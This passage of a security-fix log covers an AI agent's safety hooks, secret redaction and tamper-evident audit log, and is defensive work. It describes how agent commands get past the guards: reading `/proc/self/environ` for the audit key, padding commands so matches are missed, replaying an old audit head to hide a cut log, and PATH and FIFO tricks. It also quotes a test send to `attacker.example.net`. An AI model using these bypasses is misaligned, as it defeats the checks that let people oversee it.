  the order a nested plain call's are checked (contract, grounding,
  minimum confidence). They apply whenever the call takes the token,
  covered or not, as the enclosing destinations do.
- Sibling found here: a nested plain call made by a composite with no
  profile of its own, enclosed by one given the profiles (`audit_all` ->
  `review` -> `triage`), was checked against `review`'s rules only: the
  nesting state now gets the enclosing rules joined to the composite's
  own (`grounding: [...enclosingGrounding, ...allPolicies]`, `highest`).
- Tests (`examples/standard_agents/test/nesting.test.ts`): "applies the
  composite's profiles' output rules to a nested grounded call, as to a
  plain one" (F504 below the minimum with a file anchor, F505 with no
  anchor at 0.95 and at 0.12, executed with both; `covered_by` set; one
  `classify` counted; the same tool called on its own still passes) and
  "carries the output rules of every enclosing composite, to a grounded
  and to a plain nested call" (two composites deep). Both fail on
  89b67d3's `grounded.ts`; its plain-only variant fails too.

#### 4. The binding invoked an unregistered name whose listed send tool's own profiles set a destination policy (medium); siblings: a listed tool that reaches one, `queueTool`

`refusalOf` refused an unregistered listed name only while the layer's or
the composite's (and enclosing composites') profiles set a destination
policy; the policy of the profiles given to the listed tool itself, which
the binding applies to that tool's sends, did not count, so the runtime's
plain tool under the name sent to `attacker.example.net` with no trace
entry (also with an empty allow-list, which allows no send), and
`queueTool` queued it.

- Fix: `POLICED`, a `WeakSet` beside `PERFORMS`, holds each grounded tool
  whose own profiles set a destination policy or that invokes,
  transitively, a tool in it; `refusalOf` also refuses an unregistered
  name whose listed tool is in it (F504, the reason naming the policies
  that count), and `queueTool`, which uses `refusalOf`, with it.
- Tests: "refuses an unregistered name whose listed send tool's own
  profiles set a destination policy" (an allow-list and an empty one:
  F504, recorded `refused` with capability `send`, nothing sent or
  invoked), "refuses an unregistered name listed for a composite that
  reaches such a tool, and queues none" (`outer` -> `relay` -> `notify`,
  and `queueTool('relay')` throws F504), and the control "runs the listed
  send tool registered under its name, which checks its own policy" (F504
  to the attacker, the allowed host sent). The three refusals fail on
  89b67d3's `grounded.ts`; the control passes on both.

#### Documentation

SECURITY.md §5.4 (the audit row: the member rule and its R407; the send
row: wrapper options naming a tool, the bound of 8) and the SL paragraph
of §6 (nested grounded calls' output rules, the policies that make a
listed name need registration); `hooks/README.md` (the shared
`secret_member.jq`); the audit and send skills' hook comments and the
audit skill's constraint line; the binding's option docs, its README's
F504 row, the guide (`docs/integrations/standard_agents.md`: profiles,
registration, the guarantees row) and the binding's conformance statement
(the host gap names the policies that count); CHANGELOG [Unreleased]
Upgrading (the audit and send hooks; the binding's output rules and
registration). The Standard's text was not changed: each fix brings an
implementation to what §5.18.10, §5.21.3, §4.4.2 and §6.7 already say.

#### Checks after batch 4

- Python: `pytest tests/` in bounded parts (each file under `timeout 120`;
  `tests/test_skill_hooks.py` in seven `-k` groups that together select all
  of its 1881 tests; `tests/test_discovery/`; the files that run the
  pre-tool-use hook run again after the member rule's last change): 7412
  passed, 18 skipped (7281 before, plus the 131 new). ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the five generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the binding's check and test (254 passed, 2 skipped; 248
  before, plus the 6 new); the package's test (2015, its build reused; no
  package source changed).
- Old code: the new shell tests against 89b67d3's `skills/` and `hooks/`
  (an archive of HEAD with the new test files) and the new binding tests
  against 89b67d3's `grounded.ts`: every refusal test fails, as counted
  under each defect above; the controls, the premise and the timing of the
  send hook pass.
- Probes, each under `timeout 120` and a 4 GB address-space limit: every
  reported line through the hooks before and after; the send hook on 16 KB
  commands (3200 tool words after `echo`, 2000 `curl -q` and 3200 `http`
  after `env`, 1600 `http -s` after `prlimit`), each decided in at most
  1.7 s; the audit hook on a 1.1 MB record of 50,000 members (2.0 s), on
  800 KB of array items (2.1 s) and on 5000 nested objects (refused at
  once, not one object jq reads); the pre-tool-use hook on a 1.2 MB
  TodoWrite of 50,000 members (1.9 s, 22.4 s before). No CLI or nested
  agent was started; nothing was left running; the scratch copies were
  removed.

### Batch 5: four reported defects

Four defects, each reproduced by an independent verifier on 7d04aea, and
reproduced again here on 4678d0e before any change, with the new tests run
against 4678d0e's `grounded_agency/`, `hooks/`, `skills/`,
`packages/acs-core/src/redact.ts` and the binding's `src/acs/` (under
`timeout 120` and a 4 GB address-space limit): the binding kept the name
the model called in `action`, the audit record's `tool` and `intent` and
`acs:trace:unlinked` while its `error` read `[REDACTED]`; a registered
`4111111111111111` given as a JSON number was stored by both
`MemoryStore.persist` and the binding's persist tool; `Authorization:
ApiKey <key>` (and SSWS, Bot, Splunk, GenieKey, Key, Api-Key) was redacted
to `[REDACTED] <key>` and not refused by any of the three refusal rules; an
OpenPGP private key block was neither redacted nor refused, and a PEM key
cut before its end line kept its body. None was fixed by an earlier batch:
round 1 batches 6 and 8 redacted `error`, anchors and checkpoint ids only,
the registered values were compared with strings only, the Authorization
rule's scheme list dates from S4, and the PEM pattern's `|[\s\S]*` branch
(round 1 batch 5) replaced nothing by design, pinned by the
`pem_header_without_end` vector. Each fix has tests that fail on the code
before it (below).

#### 1. The binding's trace kept a secret the model put in a tool name: `action`, the audit record's `tool` and `intent`, the waiting list (medium); siblings: a nested call's refusal diagnostic, the Python adapter's records

`redacted()` in `examples/standard_agents/src/acs/records.ts` replaced
secrets in `error`, `checkpoint_id` and `evidence_anchors` only, though
`action` is the name the model called (`recordToolCall`) or the one a
composite's code passed to `state.invokeTool`, which its arguments can
choose (`recordRefusal`); `actionRecord` copied it into `tool` and
`intent` (§6.4), and the entry waiting for its call id kept it too. §6.7
forbids a secret in an audit record or a safety layer's record of a call.

- Fix: `redacted()` redacts `action` with the same values (the default
  patterns, the layer's secrets and the call's), which covers
  `appendTrace`, `completeTrace`, `actionRecord` and the `acs:trace:unlinked`
  copy (taken from the stored entry); `redactedName` is exported. The audit
  hook compares names redacted, with the same secrets on both sides (an
  entry a grounded tool wrote was redacted with its own secrets, which join
  the layer's), so a grounded tool whose name holds a secret is still
  linked to its call and no second entry is written.
- Sibling found here (binding): the refusal a composite's state returns for
  a nested call (`refusalOf`, the nested plain call's checks, the R402 of
  its output) is a diagnostic (§6.7) that reaches the composite's code and
  often the model: its `error`, `message`, `suggestion` and
  `location.tool` named the invoked tool verbatim, and so did the error
  `queueTool` throws. Every refusal built in `nestingState` now goes through
  `redactedRefusal` (`error` by `redactText`, `error_data` by
  `redactJson`).
- Sibling found here (Python adapter): `_record` wrote `tool` as given and
  `_refuse` put it in the diagnostic's `location`, so an MCP tool named with
  a registered secret (`mcp__srv__<secret>`) reached `call_records`,
  `export_action_records()` (`tool`, `intent`) and `diagnostics`, while the
  message was redacted. Both now redact the name. The default patterns
  still need a word boundary before a token (`\bghp_`), so
  `mcp__srv__ghp_...` is recognised only when registered.
- Tests: `layer.test.ts` "a tool name that holds a secret (security round
  4, batch 5)": the audit hook's entry and audit record for a GitHub token,
  an AWS key id, a registered secret and `x_<registered>` as the called
  name, the store holding none of them; a grounded tool named
  `sync_<registered>` recorded as `sync_[REDACTED]`, waiting under that
  name, and linked by its hook with no second entry. `nesting.test.ts` "a
  nested tool name that holds a secret": a composite invoking a name its
  arguments give (registered, a GitHub token, `x_<registered>`): F504, the
  refusal, its `location.tool`, the entry, the audit record and the store
  hold no secret; a queued call's thrown error likewise; the control (a
  listed name runs and is named as it is). `test_redaction.py`
  `test_layer_redacts_a_tool_name_that_holds_a_secret` (a bare GitHub
  token, `mcp__srv__<registered>`: the hook's reason, the call records,
  the diagnostics and the exported audit record). On 4678d0e the six
  binding refusal tests and the two adapter tests fail; the control
  passes.

#### 2. A registered secret given as a JSON number was neither refused nor redacted (medium; hardening); siblings: the evidence collector's digest, an anchor's digest

`holds_credential` / `holdsCredential` compared the registered values with
strings and member names only, and the redactors' walk returned a number
outside a secret member as it was; the canonical JSON the stores write held
the value verbatim, though `redactText` of the same JSON text replaced it.

- Fix (Python `Redactor._walk`, `holds_credential`; TypeScript
  `redactJson`, `holdsCredential`): a number whose JSON text (`json.dumps`,
  `JSON.stringify`: what each implementation's stores write) holds a
  registered value, in any of its forms, is replaced whole by the marker,
  with its pointer, and is refused. A secret member's number was already
  replaced.
- Siblings (verifier, Python): `response_digest({'pin': 4821})` kept a
  digest of a response holding a registered PIN, and `redact_anchor_data`
  kept a PIN in metadata with its digest; both follow from the walk and now
  keep neither.
- Tests: `redact.json` `registered_value_as_number` (a card number and a
  PIN containing a registered value, in a member and a list; other numbers
  and a boolean kept) and `anchor_registered_number_drops_digest`;
  `credentials.json` `registered_value_as_number`,
  `registered_value_in_nested_number` and the control
  `number_without_registered_value`; `test_memory_store.py`
  `test_a_registered_secret_given_as_a_number_is_refused` (member, list
  item, whole value; a number holding none is stored); `test_redaction.py`
  `test_no_digest_of_a_response_holding_a_registered_number`; the binding's
  `memory.test.ts` "a registered secret given as a number" (`persistEntry`
  and the persist tool with the layer's secrets, as the string form is).
  On 4678d0e every one of them fails but the control vector.

#### 3. An Authorization header with a scheme other than the five kept its credential, and no refusal rule recognised it (medium); siblings: the pair and tuple refusal, the scan's time in a multibyte locale

The scheme group `(?:bearer|basic|token|digest|negotiate)` was optional, so
for any other scheme the `secret` group matched the scheme word and stopped
at the blank; the refusal rule (`_AUTHORIZATION_VALUE`, `AUTHORIZATION_VALUE`,
`secret_scan.sh`) wanted 8 token characters right after the colon or one of
the five schemes. A curl line, an HTTP client's error, a HAR or a header
tuple with `ApiKey`, `SSWS` (Okta), `Bot` (Discord), `Splunk`, `GenieKey`
(Opsgenie), `Key` or `Api-Key` kept the key in the runner's R402 message,
trace, records and snapshot, was stored by `MemoryStore.persist`, and
passed the plugin's pre-tool-use hook as a TodoWrite.

- Fix (Python and TypeScript redaction): after `Authorization` /
  `Proxy-Authorization`, a quoted value (`"Authorization": "..."`, escaped
  or not) is read to its closing quote, whitespace and all, after one of
  the five schemes when it starts with one; a header line quoted whole (`-H
  "Authorization: ..."`, escaped or not) the same way, an attempt starting
  at the start of a run of backslashes so a run is read once; unquoted,
  when the first word is not one of the five, that word and the next on its
  line (`[ \t]+`) are replaced, since the layer cannot tell a scheme from a
  credential with no scheme (`Authorization: abcd1234 (rotated)` loses
  both words); after one of the five, the credential as before.
- Fix (refusal rule, all three): a second reading of the header value
  after any scheme word and spaces (`[A-Za-z][A-Za-z0-9._-]* +`, RFC 9110's
  `1*SP`), 8 or more token characters mixing letters and digits, besides
  the old reading; the same for a pair's and a tuple's value in text.
  Both readings are tried, so a credential with no scheme followed by a word
  is still refused. Prose passes (`Authorization: handled by the Okta
  gateway`, `Authorization: required for the admin API`, `Basic auth is
  used ...`).
- Sibling (verifier): the HAR pair and tuple text with another scheme was
  redacted whole but not refused (holds False in Python and TypeScript, the
  scan passed it); the pair and tuple readings above refuse it.
- Sibling found here: the scan's new header rule, measured under Python's
  subprocess environment (which exports `LC_CTYPE=C.UTF-8`), read 200 KB of
  `authorization: aaa...` in 2.5 s (50 KB 0.24 s, 100 KB 0.66 s): in a
  UTF-8 locale GNU grep 3.11 sends a pattern in which a class follows a
  repeated class across a space or a `[[:space:]]` to its regex matcher,
  whose time grows with the square of the line, with `-o` or without. The
  pre-tool-use hook exports `LC_ALL=C`; the persist and audit skills' hooks
  run in the user's locale. `secret_in` now runs in a subshell
  (`secret_in() ( ... )`) that sets `LC_ALL=C`, so every copy reads bytes,
  as the pre-tool-use hook's copy already did (the rules are ASCII; a value
  outside ASCII counts its bytes, so the scan refuses a superset there);
  the scheme separator is a space (` +`), which is fast in either locale.
  The same 200 KB now take 0.08 s, and every shape tried (scheme runs,
  blank runs, repeated headers, pairs, tuples, PEM and PGP headers) reads
  100 KB in at most 0.1 s.
- Tests: `redact.json` `authorization_other_schemes` (a curl line, a header
  line, `Proxy-Authorization: Bot`, a JSON member, a Python repr, an
  assignment, and a Bearer control that keeps its scheme),
  `authorization_quoted_multi_param` (`-H "Authorization: AWS4-HMAC-SHA256
  Credential=..., Signature=..."`, replaced to the closing quote),
  `authorization_without_scheme_and_a_word`,
  `authorization_other_scheme_pair_and_tuple`; `credentials.json`
  `authorization_apikey`, `_ssws`, `_bot`, `_splunk`, `_geniekey`, `_key`,
  `_other_scheme_pair`, `_other_scheme_tuple` and the control
  `authorization_two_word_prose`, which the Python, TypeScript and shell
  rules run, the scan under sh and bash, and the plugin's pre-tool-use
  hook and the SDK adapter as a TodoWrite
  (`test_they_agree_on_the_credential_vectors`);
  `test_runner_secrets.py` `test_a_host_error_quoting_a_header_or_a_key_keeps_none_of_it`
  (`apikey_header`, `ssws_header_line`: R402, nothing kept in the message,
  outputs, trace, records or snapshot); `test_memory_store.py`
  `apikey_header`; five new 1 MB long-run units and two unclosed-quote
  shapes in Python and TypeScript (at most 4.6 s and 0.4 s at 1 MB, about
  a quarter over the old patterns); `test_skill_hooks.py`
  `test_secret_scan_reads_in_linear_time_in_a_multibyte_locale` (400 KB in
  `C.UTF-8`, four shapes, sh and bash, under 5 s; the scheme and blank runs
  fail under bash with the subshell's `LC_ALL=C` removed). On 4678d0e the
  new vectors fail in Python (`test_vector`, `test_holds_credential_vector`,
  `test_holds_credential_blocks`, `test_layer_refuses_persist_data_that_holds_a_credential`),
  in TypeScript, in the scan (9 vectors, sh and bash) and in the hook
  agreement test; the prose control passes.

#### 4. An OpenPGP private key block was not recognised, and a PEM key cut before its end line kept its body (medium); sibling: `MemoryStore` stored what the refusal rule recognised when redaction changed nothing

Every pattern wanted `PRIVATE KEY-----` right after the label, so RFC 4880
armor (`PRIVATE KEY BLOCK-----`) never matched in the redactors, the
refusal shapes or `SECRET_ERE`; and a header with no end line matched the
redaction pattern's `|[\s\S]*` branch, which has no `secret` group, so an
excerpt (`head -n 2 key.pem`, a truncated log line) kept its body: for an
Ed25519 key the seed decodes back from the "redacted" text (verifier).

- Fix (Python, TypeScript, the scan): `PRIVATE KEY(?: BLOCK)?` in the
  header and the end line, the refusal shape and `SECRET_ERE`; after a
  header with no end line the rest of the text is the secret
  (`(?P<secret>[\s\S]+?)(?:-----END ...-----|\Z)`, `$` in TypeScript), still
  read once: the first header with no end consumes the text. A header with
  nothing after it holds no body and is unchanged (the refusal rule still
  refuses it).
- Sibling (verifier): `MemoryStore.persist` refused only when redaction
  returned pointers, so data the refusal rule recognised but redaction did
  not change (a key's opening line alone; before this fix, a cut key) was
  stored. It now refuses whenever `holds_credential` holds, naming the
  pointers redaction gives, or "the data". The binding's `persistEntry`
  already decided by `holdsCredential`.
- Expectations changed to the stricter behaviour (not weakened): the
  vector `pem_header_without_end` (`-----BEGIN PRIVATE KEY----- (truncated)`)
  and the two in-code assertions of `"-----BEGIN PRIVATE KEY----- x"`
  (Python `test_the_patterns_read_a_run_once_and_match_as_before`,
  TypeScript "matches as before") pinned "nothing is replaced"; they now
  expect the rest replaced.
- Tests: `redact.json` `pgp_private_key_block` (armor headers and body),
  `pem_body_without_end`, `pgp_block_without_end` and the control
  `pem_header_alone`; `credentials.json` `pgp_private_key_block` (Python,
  TypeScript, the scan, the hooks); `test_runner_secrets.py` `pgp_block`
  and `pem_without_end` (R402, no body kept anywhere);
  `test_memory_store.py` `test_a_credential_the_refusal_rule_recognises_is_refused`
  (`pgp_block`, `key_without_end`, `key_header_alone`); the 1 MB unit
  `-----BEGIN PGP PRIVATE KEY BLOCK-----`. On 4678d0e each fails but the
  control and the timing unit.

#### Documentation

SECURITY.md §1.5 (the binding's and the adapter's tool names, numbers
holding a registered value, any Authorization scheme, PEM and OpenPGP keys
and a header with no end, a store refusing what the rule recognises, the
scan reading bytes) and the §5.4 audit row (PEM and OpenPGP keys, any
scheme); `hooks/README.md` (the scan's locale); the persist skill's
constraint line; the redactors' module documentation (Python, TypeScript),
`records.ts`, `audit.ts` and `grounded.ts`; the binding guide
(`docs/integrations/standard_agents.md`, secrets); CHANGELOG [Unreleased]
Upgrading (the credential-forms entry and the binding's secrets entry). The
Standard's text was not changed: §6.7 already names a private key, a
credential in a header, an audit record, a safety layer's record of a call
and a diagnostic.

#### Checks after batch 5

- Python: `pytest tests/` in 59 bounded groups (each under `timeout 120`
  and a 4 GB address-space limit, the node ids of every file, the large
  files and `tests/test_skill_hooks.py` by class split so each group stays
  well under the limit): 7505 passed, 18 skipped (7412 before, plus the 93
  new). ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the five generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the package's build, check and test (2056 passed; 2015
  before); the binding's check and test (263 passed, 2 skipped; 254
  before).
- Old code: the new tests against 4678d0e's `grounded_agency/`, `hooks/`,
  `skills/` and `packages/acs-core/src/redact.ts` (the package rebuilt from
  it for the binding) and 4678d0e's binding `src/acs/`: 53 Python tests
  fail (`tests/test_redaction.py`, `test_memory_store.py`,
  `test_runner_secrets.py`), 18 runs of the scan's vectors (9 vectors, sh
  and bash) and the hook agreement test fail, 30 TypeScript package tests
  fail, and 8 binding tests fail (6 tool-name, 2 numeric); the controls and
  the timing units pass. The multibyte-locale timing test fails with the
  subshell's `LC_ALL=C` removed (scheme and blank runs under bash).
- Probes, each under `timeout 120` and a 4 GB address-space limit: each
  reported input through the Python and TypeScript redactors and refusal
  rules and the scan (7 schemes in 8 text forms, the PGP block, the cut PEM
  key, the numbers); the plugin's pre-tool-use hook given a TodoWrite with
  the ApiKey curl line or the PGP block (exit 2, F504) and with prose (exit
  0); the scan on 100 to 200 KB adversarial shapes in a UTF-8 locale before
  and after `LC_ALL=C`; the Python redactor on 1 MB of each new shape (at
  most 4.6 s, linear from 250 KB) and the TypeScript one (at most 0.4 s).
  No CLI or nested agent was started; nothing was left running; the
  scratch copies were removed.

### Batch 6: three reported defects

Three defects, each reproduced by an independent verifier on 7d04aea, and
reproduced again here on ae9a101 before any change (probes under
`timeout 120` and a 4 GB address-space limit): the runner submitted a
`Decision` as the host sent it, so a `decision_id`, a decision value or an
approver holding a token or a registered secret reached the trace, the
action records and the snapshot, and a value that is no decision the F502
message and the run record too; the orchestrator cut an `inquire` step's
input at 200 characters before the evidence store and the coordination
audit log redacted it; and an earlier audit head, read with an ungated
`cat` and written back with a cut, verified. None was fixed by an earlier
batch: the runner redacted an `Error`, the anchors, `not_covered` and a
cancel's reason only (round 1 batch 7, round 3 batch 4); the inquire cut
dates from S3, a sibling of the `task_goal` and delegation fixes; and the
head (round 1 batch 8, round 3 batch 1) signs only (entries, hmac). Each fix
has tests that fail on the code before it (below).

#### 1. The runner never redacted a `Decision` (medium); siblings: a checkpoint's id, an `Event`'s sender, the core's approval refusal reasons

`_turn` redacted an `Error`'s message and reason, the anchors of an
`Output` and an `Event` and a `RolledBack`'s `not_covered`; a `Decision`
went to the core untouched, and the core copies its `decision_id`,
`decision` and `approvers` into the trace (`approval_decided`), the
record's `approval`, the snapshot and, for a value it does not know or an
id used before, the F502 reason (§6.7: no secret in an audit record, an
executor's trace or a diagnostic).

- Fix (runner): `_redacted(action, response)` applies every rule before
  `_submit`; the new `_redact_members` redacts, with the runner's
  `redactor`, a `Decision`'s `decision_id`, `decision`, `approvers` and
  `approver_identities` and an `Event`'s `principal` and `identity`
  (`_KEPT_MEMBERS`). A principal is redacted by the same text rule wherever
  it is given, so `approvers` still lists the principals of
  `approver_identities` and an event's `principal` still matches its
  identity's. Redaction can make two values one; both outcomes fail
  closed: approvers that differ only in a secret count once, and a
  `decision_id` that differs from one used before only in a secret is
  refused as used (F502). `digest` is not redacted: the core compares it
  with its own and never records it.
- Sibling (verifier q1; and found here, `CreateCheckpoint`): a checkpoint's
  id reaches the trace (`checkpoint_created`, `checkpoint_consumed`), the
  records' `checkpoint_id` and the snapshot, and the run gives it back in
  `Rollback`. A redacted id would name a checkpoint the host cannot
  restore, so a gated step would run under a checkpoint the run cannot
  roll back to: `_refuse_secret_checkpoint` submits an `Error` instead, for
  a `CreateCheckpoint` answered with such an id (F501) and for a
  `checkpoint` step whose output names one (R402). No gated step runs.
- Sibling (core): `decide` formatted `'{decision}' is not a decision` and
  `decision '{decision_id}' was already used`, host text in a diagnostic,
  against SECURITY.md's "The core's diagnostics repeat no text of a host's
  output". They are now `the decision is none of approved, rejected or
  unavailable` and `the decision was already used`; no fixture pinned
  them. The trace's `approval_decided` still names both (§6.4 records the
  decision's id), so a host that drives the core itself redacts a
  `Decision` first, as the runner does (SECURITY.md says so).
- Checked, not changed: a `Current` value reaches neither the trace nor a
  record (only the `recheck` event's `changed` and the run's state, and the
  re-ask's `shown`, which §6.7 keeps whole for the digest); redacting it
  would make the digest comparison see a change where there is none, so it
  is kept as read (pinned by a test). An `Event`'s body is a canonical
  event the host makes (§6.2), kept as a step's output is; its anchors were
  redacted already. In the binding, a decision's id is built by the binding
  from the digest, the round and the approver's id, which comes from the
  runtime's authenticated caller (`approvals.post`, `decideApproval`'s
  `ThreadUser`), not from host free text: not a sibling.
- Tests: `test_runner_secrets.py` `test_a_decision_keeps_no_secret` (an id
  with an `access_token`, a registered id, a value with a GitHub token or a
  registered secret: F502, an approver with an assignment or a registered
  secret), `test_two_decision_ids_one_after_redaction_are_one_decision`,
  `test_approver_identities_keep_no_secret` (identities alone and with
  `approvers`, and a refused identity whose role holds a token),
  `test_an_events_sender_keeps_no_secret` (identity, principal and
  identity), `test_a_checkpoint_named_by_a_secret_is_refused` (a step's
  output and a `CreateCheckpoint`, a token and a registered secret), and
  the controls `test_a_decision_without_a_secret_is_kept_as_given`,
  `test_an_events_sender_without_a_secret_is_kept`,
  `test_a_recheck_compares_the_value_as_read`; `core/tests/host_protocol.rs`
  `a_refused_decision_names_neither_its_value_nor_its_id`. On ae9a101's
  `grounded_agency/` the 13 security tests fail and the 3 controls pass;
  the Rust test fails on the old `decide` (its message held the token).

#### 2. The orchestrator cut an `inquire` step's input before redaction (medium)

`str(ambiguous_input)[:200]` went into the anchor's metadata and the audit
event's details; the evidence store and `CoordinationAuditLog` redact
afterwards, when the cut has removed what the patterns need (a `ghp_`
token's 36 characters).

- Fix: the input is recorded whole, as `task_goal` and a delegation's
  description already are; the store and the log redact it.
- Sweep: every `[:N]` slice in `grounded_agency/` and every
  `.slice(0, N)` in the TypeScript sources: ids (`event_id[:8]`,
  `task_id[:8]`), a list of unrestored items, the adapter's sanitised
  variable names, and two log lines of the discovery injector and pipeline
  (logs, which no rule of §6.7 names); no other cut before a redaction.
- Tests: `test_redaction.py` `test_an_inquire_steps_input_is_redacted_whole`
  (a token at offset 171 and 166, a PEM key whose end line the cut
  removed, a short key whose whole body the cut kept): no fragment in the
  store's export, the log's events and action records, or the returned
  anchor. On ae9a101 the two token shapes fail; the two key shapes pass
  there already, since batch 5's PEM rule redacts the rest of a text after
  a header with no end line (the verifier's key leaks were on 7d04aea).

#### 3. A replayed earlier head hid a cut of the audit log (low)

The head and its anchor sign only (entries, hmac), so a head stays valid
for as long as its key. The agent's commands read both ungated (`cat
.claude/audit.head`, `cat .git/acs/audit.head`: exit 0), and a command a
person approved that names neither (§5.5) could cut the log and write the
saved head back: the verifier passed and the hook went on from the cut.

- Analysis: the Standard asks only that an append-only store chain its
  records (§6.4, SHOULD); the head is the plugin's own claim, and it
  overclaimed. Refusing reads of the head would not close the gap: the
  agent's commands can also read the key (probed here: `cat
  /proc/self/environ` and `grep -a AUDIT /proc/self/environ` pass the
  pre-tool-use hook, exit 0, and Claude Code gives every command the `env`
  of its settings, where the hooks' README says to set
  `AUDIT_HMAC_KEY`), and with the key a head is signed anew, no replay
  needed; and a read through a pattern or a directory (`cat
  .claude/audit.he*`, `grep -r . .claude`, both exit 0) names no head. No
  local state the hook keeps is out of reach of an approved command, so
  the fix is a witness kept outside the agent's reach, and the claims made
  true.
- Fix: `tools/verify_audit_log.py --witness PATH` (repeatable; `verify_log(...,
  witness_paths=...)`): a copy of a head kept where the agent cannot write
  it (copied off the machine at a session's end, a CI artifact, a
  write-once store), checked as the head is (signed with the key, the log
  holds its entry at its place); a log cut before the witness's entry
  fails, and goes on failing as the log grows again. The replay probe
  rerun here with a witness taken after the fifth entry: the verifier
  fails (`the log ends before its witness: 5 entries recorded, 3 found`),
  while the head and the anchor pass, as documented.
- Documentation corrected: SECURITY.md §5.2 (the head and the anchor show
  a cut by a writer that holds neither the key nor an earlier head, not
  one made through the agent; the witness) and §5.5 (the bullet on the
  records); `hooks/README.md`, the log hook's header comment and the
  verifier's docstring; CHANGELOG.
- Tests: `test_verify_audit_log.py`
  `test_an_earlier_head_written_back_hides_a_cut_but_not_from_a_witness`
  (the limitation pinned: head and hook see nothing; the witness fails the
  log, by length and then by entry, through the API and the CLI),
  `test_a_witness_the_log_has_grown_past_verifies`,
  `test_a_witness_that_is_missing_or_another_key_signed_fails`. On ae9a101
  they fail (`verify_log` takes no witness, the CLI no `--witness`).

#### Documentation

SECURITY.md §1.5 (the runner's `Decision`, `Event` sender and checkpoint
ids; the orchestrator's inquire input; the core's approval refusals), §5.2
and §5.5 (the head, the key, the witness); the runner's `redactor`,
`Host.create_checkpoint` and `Host.request_approval` documentation;
`docs/guides/RUNNING_WORKFLOWS.md` (secrets); `hooks/README.md`, the log
hook's header and the verifier's docstring; CHANGELOG [Unreleased]
Upgrading (the runner entry, the evidence entry, the audit log's end). The
Standard's text was not changed: §6.7 already names an audit record, an
executor's trace and a diagnostic, and §6.4 asks only for the chain.

#### Checks after batch 6

- Python: `pytest tests/` in bounded groups (each under `timeout 120` and a
  4 GB address-space limit: each file, `tests/test_skill_hooks.py` and
  `tests/test_pretooluse_hooks.py` by class and their module-level tests,
  `tests/test_discovery/`, and `tests/test_redaction.py` in six chunks of
  node ids, since its 1 MB timing units take about 170 s together): 7528
  passed, 18 skipped, of 7546 collected (7505 before, plus the 23 new).
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; `sync_skill_schemas.py --check` and the five
  generators' `--check`; `scripts/run_conformance.py`.
- Rust: `cargo fmt --check`; clippy with no feature, `python` and `wasm`
  (`-D warnings`); `cargo test` (every test binary and the library, each
  under the limits; `host_protocol` 33, with the new test) and
  `cargo test --features wasm --test wasm`. The extension was rebuilt
  (`uv pip install -e`) and the WebAssembly core (`npm run build:wasm`).
- TypeScript: the package's build, check and test (2056 passed); the
  binding's check and test (263 passed, 2 skipped). No TypeScript source
  changed.
- Old code: the new tests against ae9a101's `grounded_agency/`, `tools/`,
  `hooks/` and extension: 18 fail (13 runner, 2 inquire token shapes, 3
  witness), 5 pass (the 3 runner controls and the 2 key shapes batch 5
  already covers); the Rust test fails on ae9a101's `decide`.
- Probes, each under `timeout 120` and a 4 GB address-space limit: every
  response kind through the runner with a registered secret and default
  patterns (decision id, value, approvers, identities, a refused identity's
  role, a checkpoint step's id, a `CreateCheckpoint` id, an event's
  identity and principal, a `Current` value) before and after the fix; the
  pre-tool-use hook on reads of the head, the anchor, the checkpoint key
  and `/proc/self/environ` (all exit 0) and on `echo $AUDIT_HMAC_KEY` and
  `printenv` (F501); the verifier's replay script with a witness. No CLI
  or nested agent was started; nothing was left running; the scratch
  copies were removed.

## Round 5

### Batch 1: four reported defects

Four defects, each reproduced by an independent verifier on 4d17c00, and
reproduced again here before any change (probes under `timeout 120` and a
4 GB address-space limit, in scratch repositories since removed): `cp
t.json notes && echo {1..4000} > /dev/null`, with `notes` a shipped link to
the marker, was asked as an ordinary mutate (F504 without the padding); a
link to `evil\n` was followed to `evil`, so `touch notes` and `cat k.txt >
notes` were asked though `evil\n` leads to the checkpoint key, and so was
`touch n` from a cwd `d\n`; `git status` and `cat README.md` with
`PATH=node_modules/.bin:$PATH`, and `ls` with a leading colon, exited 0 and
the repository's programs ran; and with `include.path = inc.fifo` (a FIFO)
in the project's git configuration, a Write and `rm -rf src` gave no
verdict in 35 s. None was fixed by an earlier batch: the persist secret
scan's pipefail note (round 2) covered `secret_in` alone; the link
following of round 2 #4 and round 3 read every target with `$(readlink)`;
round 4 batch 1 #1 refused a `PATH` the project's settings set, and
`hook_path` filtered the hook's own `PATH`, not the agent's; and no hook
bounded a git call. Each fix has tests that fail on the code before it
(below).

#### 1. The records guard's resolved-path checks read a match as none past a pipe's worth of paths (medium)

Both checks ran `printf '%s\n' "${resolved[@]}" | grep -q ...` under
`set -o pipefail`. grep stopped at the first match; printf, with more than
a pipe holds still to write (about 64 KB of resolved paths: `echo
{1..2000}` with a typical project path), died of SIGPIPE, and pipefail made
the pipeline's status 141, read as no match. Every link, brace, tilde and
`$'...'` reading of the guard was then skipped: one approved command could
write the key and a signed `commits/<C>` entry, after which `git stash
apply <C>` passed as a rollback.

- Fix: `resolved_match` runs `grep -c`, which reads every line (no
  SIGPIPE), for both checks (the records paths, and the directories that
  hold them), and takes status 0 with a count as a match and 1 with 0 as
  none; any other answer of grep blocks the call (R407): the guard cannot
  tell.
- Siblings: no other pipeline in the hooks ends in a reader that stops
  early (`awk` and `jq` read all their input; the log hook's `head -n 1`
  only shortens a message). `secret_in` keeps the round-2 rule: the
  pre-tool-use hook calls it with pipefail off; the skills' hooks run under
  `/bin/sh` with no pipefail (dash has none, and bash as `sh` takes it only
  from a `SHELLOPTS` the user exports, which the project's settings cannot
  set without every call being refused).
- Tests: `test_records_guard.py` `TestManyResolvedPaths`: a records path
  among 4000 padding words (`cp ... notes/todo.md`, `cp -r ... notes/k/`,
  `cat ... > .claude/check{p,q}oint.ok` with 12 brace groups, `cp ...
  .git/acs/check{points,}/key`, `touch ~+/notes/todo.md`), the directory
  that holds them (`rm -rf .clau{d,x}e` with 12 groups, `rm -rf lnk`, `rm
